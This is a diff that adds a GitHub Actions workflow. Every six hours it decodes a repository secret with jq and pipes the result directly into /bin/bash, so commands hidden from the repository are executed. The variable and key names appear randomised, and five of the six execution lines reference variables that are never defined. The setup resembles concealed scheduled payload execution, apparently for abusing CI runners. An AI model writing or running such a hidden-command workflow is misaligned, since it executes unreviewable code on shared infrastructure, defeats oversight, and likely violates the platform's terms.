@@ -1,0 +1,22 @@
+name: xushengtian4175
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xushengtian4175
+        env:
+          f7884: ${{ secrets.f7884 }}
+        run: |
+          echo $f7884 | jq -r .qk446 | /bin/bash
+          echo $cfsqg08997 | jq -r .clwt70926 | /bin/bash
+          echo $cd5323 | jq -r .n412 | /bin/bash
+          echo $uk1333 | jq -r .tsasy71401 | /bin/bash
+          echo $gxmr137 | jq -r .g82182 | /bin/bash
+          echo $irptk2 | jq -r .igelp3 | /bin/bash
+
